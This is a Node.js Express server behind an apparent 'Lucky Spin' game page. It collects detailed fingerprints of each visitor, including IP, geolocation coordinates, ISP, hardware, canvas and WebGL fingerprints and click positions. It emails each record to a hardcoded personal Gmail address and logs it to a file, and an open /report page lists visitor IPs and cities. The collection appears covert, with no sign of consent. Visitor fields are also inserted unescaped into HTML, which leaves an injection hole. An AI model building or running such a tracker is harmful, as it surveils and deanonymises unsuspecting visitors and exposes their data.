const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const dotenv = require('dotenv');
const fs = require('fs');
const path = require('path');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'tracking_data.json');

// Initialize data file if not exists
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify({ visitors: [] }, null, 2));
}

// Helper function to read data
function readData() {
    try {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return { visitors: [] };
    }
}

// Helper function to write data
function writeData(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// Get statistics by date
function getStatsByDate() {
    const data = readData();
    const statsByDate = {};
    
    data.visitors.forEach(visitor => {
        const date = new Date(visitor.timestamp).toLocaleDateString('vi-VN');
        if (!statsByDate[date]) {
            statsByDate[date] = {
                count: 0,
                visitors: [],
                devices: { mobile: 0, desktop: 0, tablet: 0 },
                browsers: {},
                countries: {}
            };
        }
        
        statsByDate[date].count++;
        statsByDate[date].visitors.push({
            ip: visitor.ip,
            device: visitor.device,
            country: visitor.country,
            city: visitor.city,
            time: new Date(visitor.timestamp).toLocaleTimeString('vi-VN')
        });
        
        // Count devices
        if (visitor.device.includes('Mobile') || visitor.device.includes('iPhone') || visitor.device.includes('Android')) {
            statsByDate[date].devices.mobile++;
        } else if (visitor.device.includes('Tablet')) {
            statsByDate[date].devices.tablet++;
        } else {
            statsByDate[date].devices.desktop++;
        }
        
        // Count browsers
        statsByDate[date].browsers[visitor.browser] = (statsByDate[date].browsers[visitor.browser] || 0) + 1;
        
        // Count countries
        statsByDate[date].countries[visitor.country] = (statsByDate[date].countries[visitor.country] || 0) + 1;
    });
    
    return statsByDate;
}

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.')); // Serve static files from current directory

// Configure email transporter
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASSWORD
    }
});

// Route to send IP information via email
app.post('/send-ip', async (req, res) => {
    try {
        const data = req.body;

        // Format WebGL info
        const webGLInfo = typeof data.webGL === 'object' 
            ? `${data.webGL.vendor} - ${data.webGL.renderer}`
            : data.webGL;

        const mailOptions = {
            from: process.env.EMAIL_USER,
            to: 'truongminhtien071220005@gmail.com',
            subject: `🎯 Lucky Spin - New Player: ${data.ip} (${data.device})`,
            html: `
                <div style="font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f5f5f5;">
                    <div style="background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%); padding: 30px; border-radius: 10px 10px 0 0;">
                        <h1 style="color: white; margin: 0; text-align: center;">🎮 Lucky Spin - Player Tracked</h1>
                    </div>
                    
                    <div style="background: white; padding: 30px; border-radius: 0 0 10px 10px;">
                        
                        <!-- Location Info -->
                        <h2 style="color: #ff6b6b; border-bottom: 2px solid #ff6b6b; padding-bottom: 10px; margin-top: 0;">📍 Vị Trí & IP</h2>
                        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold; width: 35%;">🌐 Địa chỉ IP:</td>
                                <td style="padding: 10px; background: #fff;">${data.ip}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🏙️ Thành phố:</td>
                                <td style="padding: 10px; background: #fff;">${data.city}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🗺️ Vùng/Tỉnh:</td>
                                <td style="padding: 10px; background: #fff;">${data.region}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🌍 Quốc gia:</td>
                                <td style="padding: 10px; background: #fff;">${data.country} (${data.countryCode})</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">📮 Postal Code:</td>
                                <td style="padding: 10px; background: #fff;">${data.postal}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">📌 Tọa độ:</td>
                                <td style="padding: 10px; background: #fff;">${data.latitude}, ${data.longitude}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🏢 ISP/Tổ chức:</td>
                                <td style="padding: 10px; background: #fff;">${data.org}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🔢 ASN:</td>
                                <td style="padding: 10px; background: #fff;">${data.asn}</td>
                            </tr>
                        </table>

                        <!-- Device Info -->
                        <h2 style="color: #4ecdc4; border-bottom: 2px solid #4ecdc4; padding-bottom: 10px;">📱 Thiết Bị</h2>
                        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold; width: 35%;">📱 Loại thiết bị:</td>
                                <td style="padding: 10px; background: #fff;">${data.device}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">💻 Hệ điều hành:</td>
                                <td style="padding: 10px; background: #fff;">${data.os}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🌐 Trình duyệt:</td>
                                <td style="padding: 10px; background: #fff;">${data.browser}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🖥️ Platform:</td>
                                <td style="padding: 10px; background: #fff;">${data.platform}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">📱 Touch Support:</td>
                                <td style="padding: 10px; background: #fff;">${data.touchSupport ? 'Có' : 'Không'} (${data.maxTouchPoints} điểm)</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🏭 Vendor:</td>
                                <td style="padding: 10px; background: #fff;">${data.vendor}</td>
                            </tr>
                        </table>

                        <!-- Screen & Display -->
                        <h2 style="color: #ffe66d; border-bottom: 2px solid #ffe66d; padding-bottom: 10px;">🖥️ Màn Hình</h2>
                        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold; width: 35%;">📺 Độ phân giải màn hình:</td>
                                <td style="padding: 10px; background: #fff;">${data.screenResolution} (${data.screenWidth}x${data.screenHeight})</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🪟 Kích thước cửa sổ:</td>
                                <td style="padding: 10px; background: #fff;">${data.windowResolution} (${data.windowWidth}x${data.windowHeight})</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🎨 Color Depth:</td>
                                <td style="padding: 10px; background: #fff;">${data.screenColorDepth}-bit</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">📊 Pixel Depth:</td>
                                <td style="padding: 10px; background: #fff;">${data.screenPixelDepth}-bit</td>
                            </tr>
                        </table>

                        <!-- Hardware -->
                        <h2 style="color: #a8e6cf; border-bottom: 2px solid #a8e6cf; padding-bottom: 10px;">⚙️ Phần Cứng</h2>
                        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold; width: 35%;">🔢 CPU Cores:</td>
                                <td style="padding: 10px; background: #fff;">${data.hardwareConcurrency}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">💾 RAM:</td>
                                <td style="padding: 10px; background: #fff;">${data.deviceMemory}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🎮 WebGL:</td>
                                <td style="padding: 10px; background: #fff; font-size: 11px;">${webGLInfo}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🖼️ Canvas Fingerprint:</td>
                                <td style="padding: 10px; background: #fff; font-size: 10px; word-break: break-all;">${data.canvas}</td>
                            </tr>
                        </table>

                        <!-- Network & Connection -->
                        <h2 style="color: #ff8b94; border-bottom: 2px solid #ff8b94; padding-bottom: 10px;">📡 Kết Nối</h2>
                        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold; width: 35%;">📶 Loại kết nối:</td>
                                <td style="padding: 10px; background: #fff;">${data.connectionType}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">⬇️ Downlink:</td>
                                <td style="padding: 10px; background: #fff;">${data.connectionDownlink} Mbps</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">⏱️ RTT:</td>
                                <td style="padding: 10px; background: #fff;">${data.connectionRtt} ms</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🌐 Online:</td>
                                <td style="padding: 10px; background: #fff;">${data.onLine ? 'Có' : 'Không'}</td>
                            </tr>
                        </table>

                        <!-- Language & Location Settings -->
                        <h2 style="color: #667eea; border-bottom: 2px solid #667eea; padding-bottom: 10px;">🌍 Ngôn Ngữ & Thời Gian</h2>
                        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold; width: 35%;">🗣️ Ngôn ngữ chính:</td>
                                <td style="padding: 10px; background: #fff;">${data.language}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🌐 Ngôn ngữ hỗ trợ:</td>
                                <td style="padding: 10px; background: #fff;">${data.languages}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🕐 Múi giờ:</td>
                                <td style="padding: 10px; background: #fff;">${data.timezone}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">⏰ Offset:</td>
                                <td style="padding: 10px; background: #fff;">${data.timezoneOffset} phút</td>
                            </tr>
                        </table>

                        <!-- Browser Settings -->
                        <h2 style="color: #764ba2; border-bottom: 2px solid #764ba2; padding-bottom: 10px;">🔧 Cài Đặt Trình Duyệt</h2>
                        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold; width: 35%;">🍪 Cookies:</td>
                                <td style="padding: 10px; background: #fff;">${data.cookiesEnabled ? 'Bật' : 'Tắt'}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🔒 Do Not Track:</td>
                                <td style="padding: 10px; background: #fff;">${data.doNotTrack}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">☕ Java:</td>
                                <td style="padding: 10px; background: #fff;">${data.javaEnabled ? 'Có' : 'Không'}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">💾 LocalStorage:</td>
                                <td style="padding: 10px; background: #fff;">${data.localStorage ? 'Có' : 'Không'}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">📦 IndexedDB:</td>
                                <td style="padding: 10px; background: #fff;">${data.indexedDB ? 'Có' : 'Không'}</td>
                            </tr>
                        </table>

                        <!-- Page Info -->
                        <h2 style="color: #ff6b6b; border-bottom: 2px solid #ff6b6b; padding-bottom: 10px;">📄 Thông Tin Trang</h2>
                        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold; width: 35%;">📝 Tiêu đề:</td>
                                <td style="padding: 10px; background: #fff;">${data.pageTitle}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🔗 URL:</td>
                                <td style="padding: 10px; background: #fff; word-break: break-all; font-size: 12px;">${data.pageUrl}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🔙 Referrer:</td>
                                <td style="padding: 10px; background: #fff;">${data.referrer}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🔐 Protocol:</td>
                                <td style="padding: 10px; background: #fff;">${data.protocol}</td>
                            </tr>
                        </table>

                        ${data.clickPosition ? `
                        <!-- Click Info -->
                        <h2 style="color: #4ecdc4; border-bottom: 2px solid #4ecdc4; padding-bottom: 10px;">🖱️ Thông Tin Click</h2>
                        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold; width: 35%;">📍 Vị trí (Client):</td>
                                <td style="padding: 10px; background: #fff;">X: ${data.clickPosition.x}, Y: ${data.clickPosition.y}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">📄 Vị trí (Page):</td>
                                <td style="padding: 10px; background: #fff;">X: ${data.clickPosition.pageX}, Y: ${data.clickPosition.pageY}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">🖥️ Vị trí (Screen):</td>
                                <td style="padding: 10px; background: #fff;">X: ${data.clickPosition.screenX}, Y: ${data.clickPosition.screenY}</td>
                            </tr>
                            <tr>
                                <td style="padding: 10px; background: #f8f9fa; font-weight: bold;">⏰ Thời gian click:</td>
                                <td style="padding: 10px; background: #fff;">${data.clickTime ? new Date(data.clickTime).toLocaleString('vi-VN') : 'N/A'}</td>
                            </tr>
                        </table>
                        ` : ''}

                        <!-- User Agent -->
                        <h2 style="color: #a8e6cf; border-bottom: 2px solid #a8e6cf; padding-bottom: 10px;">🔍 User Agent</h2>
                        <div style="padding: 15px; background: #f8f9fa; border-radius: 5px; word-break: break-all; font-size: 11px; font-family: monospace;">
                            ${data.userAgent}
                        </div>

                        <!-- Plugins -->
                        ${data.plugins && data.plugins !== 'None' ? `
                        <h2 style="color: #ff8b94; border-bottom: 2px solid #ff8b94; padding-bottom: 10px; margin-top: 20px;">🔌 Plugins</h2>
                        <div style="padding: 15px; background: #f8f9fa; border-radius: 5px; font-size: 12px;">
                            ${data.plugins}
                        </div>
                        ` : ''}

                        <!-- Timestamp -->
                        <div style="margin-top: 30px; padding: 20px; background: #e7f3ff; border-left: 4px solid #667eea; border-radius: 5px;">
                            <p style="margin: 0; color: #333;">
                                <strong>📧 Email này được gửi tự động từ Lucky Spin Game</strong><br>
                                <span style="font-size: 12px; opacity: 0.8;">⏰ Thời gian: ${data.timestampLocal}</span>
                            </p>
                        </div>
                    </div>
                    
                    <div style="text-align: center; margin-top: 20px; color: #666; font-size: 12px;">
                        <p>© 2025 Lucky Spin Tracker System</p>
                    </div>
                </div>
            `
        };

        // Save data to file
        const trackingData = readData();
        trackingData.visitors.push({
            ip: data.ip,
            timestamp: data.timestamp,
            device: data.device,
            browser: data.browser,
            os: data.os,
            country: data.country,
            city: data.city,
            region: data.region,
            screenResolution: data.screenResolution,
            language: data.language,
            timezone: data.timezone,
            referrer: data.referrer,
            clickPosition: data.clickPosition,
            fullData: data
        });
        writeData(trackingData);
        
        await transporter.sendMail(mailOptions);
        
        console.log(`✅ Email sent successfully for IP: ${data.ip} (${data.device})`);
        console.log(`📊 Total visitors: ${trackingData.visitors.length}`);
        
        res.json({ 
            success: true, 
            message: 'Email sent successfully',
            totalVisitors: trackingData.visitors.length
        });
        
    } catch (error) {
        console.error('❌ Error sending email:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Failed to send email',
            error: error.message 
        });
    }
});

// Root route
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', message: 'Server is running' });
});

// Get daily report
app.get('/report', (req, res) => {
    const stats = getStatsByDate();
    const data = readData();
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>📊 Báo Cáo Truy Cập</title>
            <meta charset="UTF-8">
            <style>
                body {
                    font-family: Arial, sans-serif;
                    max-width: 1200px;
                    margin: 0 auto;
                    padding: 20px;
                    background: #f5f5f5;
                }
                .header {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    padding: 30px;
                    border-radius: 10px;
                    margin-bottom: 20px;
                }
                .summary {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 15px;
                    margin-bottom: 20px;
                }
                .card {
                    background: white;
                    padding: 20px;
                    border-radius: 10px;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                }
                .card h3 {
                    margin: 0 0 10px 0;
                    color: #667eea;
                }
                .card .number {
                    font-size: 2em;
                    font-weight: bold;
                    color: #333;
                }
                .day-section {
                    background: white;
                    padding: 20px;
                    border-radius: 10px;
                    margin-bottom: 15px;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                }
                .day-header {
                    border-bottom: 2px solid #667eea;
                    padding-bottom: 10px;
                    margin-bottom: 15px;
                }
                table {
                    width: 100%;
                    border-collapse: collapse;
                    margin-top: 10px;
                }
                th, td {
                    padding: 10px;
                    text-align: left;
                    border-bottom: 1px solid #ddd;
                }
                th {
                    background: #f8f9fa;
                    font-weight: bold;
                }
                .device-stats {
                    display: flex;
                    gap: 20px;
                    margin: 15px 0;
                }
                .stat-item {
                    flex: 1;
                    text-align: center;
                    padding: 10px;
                    background: #f8f9fa;
                    border-radius: 5px;
                }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>📊 Báo Cáo Truy Cập Lucky Spin</h1>
                <p>Thống kê chi tiết theo ngày</p>
            </div>
            
            <div class="summary">
                <div class="card">
                    <h3>👥 Tổng Truy Cập</h3>
                    <div class="number">${data.visitors.length}</div>
                </div>
                <div class="card">
                    <h3>📅 Số Ngày</h3>
                    <div class="number">${Object.keys(stats).length}</div>
                </div>
                <div class="card">
                    <h3>📱 Mobile</h3>
                    <div class="number">${data.visitors.filter(v => v.device.includes('Mobile') || v.device.includes('iPhone') || v.device.includes('Android')).length}</div>
                </div>
                <div class="card">
                    <h3>💻 Desktop</h3>
                    <div class="number">${data.visitors.filter(v => v.device.includes('Desktop') || v.device.includes('Laptop')).length}</div>
                </div>
            </div>
            
            ${Object.keys(stats).reverse().map(date => `
                <div class="day-section">
                    <div class="day-header">
                        <h2>📅 ${date}</h2>
                        <p>Tổng: <strong>${stats[date].count}</strong> lượt truy cập</p>
                    </div>
                    
                    <div class="device-stats">
                        <div class="stat-item">
                            <div>📱 Mobile</div>
                            <strong>${stats[date].devices.mobile}</strong>
                        </div>
                        <div class="stat-item">
                            <div>💻 Desktop</div>
                            <strong>${stats[date].devices.desktop}</strong>
                        </div>
                        <div class="stat-item">
                            <div>📲 Tablet</div>
                            <strong>${stats[date].devices.tablet}</strong>
                        </div>
                    </div>
                    
                    <h3>🌐 Trình duyệt</h3>
                    <p>${Object.entries(stats[date].browsers).map(([browser, count]) => `${browser}: ${count}`).join(' | ')}</p>
                    
                    <h3>🌍 Quốc gia</h3>
                    <p>${Object.entries(stats[date].countries).map(([country, count]) => `${country}: ${count}`).join(' | ')}</p>
                    
                    <h3>👥 Chi tiết truy cập</h3>
                    <table>
                        <tr>
                            <th>Thời gian</th>
                            <th>IP</th>
                            <th>Thiết bị</th>
                            <th>Vị trí</th>
                        </tr>
                        ${stats[date].visitors.map(v => `
                            <tr>
                                <td>${v.time}</td>
                                <td>${v.ip}</td>
                                <td>${v.device}</td>
                                <td>${v.city}, ${v.country}</td>
                            </tr>
                        `).join('')}
                    </table>
                </div>
            `).join('')}
        </body>
        </html>
    `);
});

// Get JSON stats
app.get('/api/stats', (req, res) => {
    const stats = getStatsByDate();
    const data = readData();
    res.json({
        totalVisitors: data.visitors.length,
        statsByDate: stats
    });
});

// Send daily report email
app.get('/api/send-daily-report', async (req, res) => {
    try {
        const stats = getStatsByDate();
        const data = readData();
        const today = new Date().toLocaleDateString('vi-VN');
        const todayStats = stats[today] || { count: 0, visitors: [], devices: {}, browsers: {}, countries: {} };
        
        const mailOptions = {
            from: process.env.EMAIL_USER,
            to: 'truongminhtien071220005@gmail.com',
            subject: `📊 Báo Cáo Hàng Ngày - ${today} - ${todayStats.count} Truy Cập`,
            html: `
                <div style="font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px;">
                    <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px;">
                        <h1>📊 Báo Cáo Hàng Ngày</h1>
                        <h2>${today}</h2>
                    </div>
                    
                    <div style="background: white; padding: 30px; margin-top: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
                        <h2>📈 Tổng Quan</h2>
                        <table style="width: 100%; border-collapse: collapse;">
                            <tr>
                                <td style="padding: 15px; background: #f8f9fa; border: 1px solid #ddd;"><strong>👥 Tổng truy cập hôm nay:</strong></td>
                                <td style="padding: 15px; background: #fff; border: 1px solid #ddd; font-size: 24px; font-weight: bold; color: #667eea;">${todayStats.count}</td>
                            </tr>
                            <tr>
                                <td style="padding: 15px; background: #f8f9fa; border: 1px solid #ddd;"><strong>📊 Tổng tất cả:</strong></td>
                                <td style="padding: 15px; background: #fff; border: 1px solid #ddd; font-size: 18px;">${data.visitors.length}</td>
                            </tr>
                            <tr>
                                <td style="padding: 15px; background: #f8f9fa; border: 1px solid #ddd;"><strong>📱 Mobile:</strong></td>
                                <td style="padding: 15px; background: #fff; border: 1px solid #ddd;">${todayStats.devices.mobile || 0}</td>
                            </tr>
                            <tr>
                                <td style="padding: 15px; background: #f8f9fa; border: 1px solid #ddd;"><strong>💻 Desktop:</strong></td>
                                <td style="padding: 15px; background: #fff; border: 1px solid #ddd;">${todayStats.devices.desktop || 0}</td>
                            </tr>
                        </table>
                        
                        <h2 style="margin-top: 30px;">🌐 Trình duyệt</h2>
                        <p>${Object.entries(todayStats.browsers).map(([b, c]) => `<strong>${b}:</strong> ${c}`).join(' | ') || 'Chưa có dữ liệu'}</p>
                        
                        <h2 style="margin-top: 30px;">🌍 Quốc gia</h2>
                        <p>${Object.entries(todayStats.countries).map(([c, count]) => `<strong>${c}:</strong> ${count}`).join(' | ') || 'Chưa có dữ liệu'}</p>
                        
                        <div style="margin-top: 30px; padding: 20px; background: #e7f3ff; border-left: 4px solid #667eea; border-radius: 5px;">
                            <p style="margin: 0;">📧 <strong>Xem báo cáo chi tiết tại:</strong><br>
                            <a href="http://localhost:3000/report" style="color: #667eea;">http://localhost:3000/report</a></p>
                        </div>
                    </div>
                </div>
            `
        };
        
        await transporter.sendMail(mailOptions);
        res.json({ success: true, message: 'Daily report sent' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server is running on http://localhost:${PORT}`);
    console.log(`📧 Email will be sent to: truongminhtien071220005@gmail.com`);
});
